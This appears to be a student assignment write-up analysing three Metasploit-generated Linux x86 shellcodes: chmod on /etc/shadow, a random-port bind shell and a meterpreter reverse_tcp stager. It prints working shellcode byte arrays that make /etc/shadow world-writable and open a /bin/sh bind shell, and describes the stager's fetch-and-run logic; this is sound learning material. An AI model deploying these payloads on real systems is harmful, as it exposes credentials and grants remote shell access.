### Assignment Five:

1. Take up at least 3 shellcode samples created using Msfpayload for linux/x86
2. Use GDB/Ndisasm/Libemu to dissect the funcSonality of the shellcode
3. Present your analysis

In this assignment, I am going to analyst 3 shellcode generated by msfvenom. Since we already covered the classic bind shell and reverse shell in previous assignment, I am not going to repeat those findings. Instead, I choose the following 3 shellcode.

1. linux/x86/chmod
2. linux/x86/meterpreter/reverse_tcp
3. linux/x86/shell_bind_tcp_random_port

### linux/x86/chmod:

```

Using msfvenom, we get the following shellcode:

```c
unsigned char buf[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";
```

With the help of ndisasm, we can understand what systemcall does the shellcode use.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-1.JPG"/>

Two systemcalls are used in this shellcode. According to /usr/include/i386-linux-gnu/asm/unistd_32.h, 
```
#define __NR_chmod 15 = 0xf
#define __NR_exit 1 = 0x1
```

So now we know which systemcalls the shellcode use, the rest will be figuring out how the arguments are passed to the call.

The shellcode will first use cdq <https://www.aldeid.com/wiki/X86-assembly/Instructions/cdq> to set both eax and edx to 0x0. Then, it will assign eax to 0xf, push edx to stack and make a call to 0x16.
This call is actually very interesting because it skip all instruction in between. After examine the value of ebx, we find out that it stores an address value which and be translate back to /etc/shadow.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-2.JPG"/>

So, where does the /etc/shadow come from? there are no sign of the assembly trying to push the value to stack, instead, it just appears after pop ebx.
Remember what we have learnt from the jmp-call-pop technique?
After a call, the next instruction's address will be pushed to the stack. Indeed, ndisasm actually interpret our /etc/shadow to opcode. If we look closer, we will find out the opcode in between is actually hex form of /etc/shadow and ebx is actually referencing the address of the start of /etc/shadow

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-4.JPG"/>
<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-5.JPG"/>
<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-6.JPG"/>

How about the permission? In Linux, we knew that permission is assigned to a few value, read = 4, write = 2, execute = 1. The default of this chmod shellcode is going to set the permission to world wide read and writable so we are looking for 0666. After throwing the value that is going to assign to ecx, we got

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-3.JPG"/>

The octet value of 1B6 is 666, look promising. 

Now, we have all the values and after calling the systemcall, the premission if /etc/shadow was changed

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-7.JPG"/>

The rest will be calling the exit systemcall, which is very simple. 

### linux/x86/shell_bind_tcp_random_port:

The random port shellcode will assign a bind shell to a random port. When it execute, it look something like this.

```

Using msfvenom, we get the following shellcode:

```c
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80"
"\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80"
"\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80";
```

With the help of ndisasm, we can understand what systemcall does the shellcode use.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-9.JPG"/>

As this shellcode is very similar to a bind shell shellcode, the systemcall involved should be mostly the same, what interest me is how a random port is being assigned. After examine the code, we found these systemcalls. 
```
#define __NR_socketcall 102 = 0x66
#define __NR_dup2 63 = 0x3f
#define __NR_execve 11 = 0xb
```

Since dup2 and execve will be the same, we will not spend much time on them. Instead, it is interesting that compare to the classic bind shell, only 3 socketcall involved in this shellcode. We will need to study which 3 socketcall are called and how it bind to a random port. 

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-10.JPG"/>

It was found that socketcall only called socket, listen and accept for this bind shell, after that, a random port is opened and waiting for incoming connect. To my surprise, I though that the shellcode will need to call some systemcall that generate a random number and assign to bind. However, the truth is, by not calling bind, a random port will be assigned.

### linux/x86/meterpreter/reverse_tcp:

Last but not least, our famous meterpreter shell, I would like to study how this really works, why it can provide a lot more function than a normal reverse shell.

Using msfvenom, we get the following shellcode:

LHOST= 192.168.170.128

```c
unsigned char buf[] =

```

With the help of ndisasm, we can understand what systemcall does the shellcode use.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/SLAE/Ex5-11.JPG"/>

Since the shellcode is longer that the previous two, I will split it to parts and explain them one by one.

If we look closely, we will find that the first part of the shellcode actually work just like a classic reverse shell shellcode. As such, we can focus on the second part.

After some research, we know that the following systemcall involved in the shellcode.

```
#define __NR_nanosleep 162 = 0xa2
#define __NR_mprotect 125 = 0x7d
#define __NR_read 3 = 0x3

#### Conclusion:
After studying the shellcode, we know that the shellcode will perform the following actions
1. Create a socket
2. Attempt to connect to remote host
3. If connected, jump to mprotect and allocate stack space
4. If not, attempt to sleep for a while and re do all connections
5. Read stage being passed through socket and allocate them to stack space
6. Continue the operation inside the stage

extra. After every operation, a validation will be performed to check any error. If there is an error, the shellcode will exit.
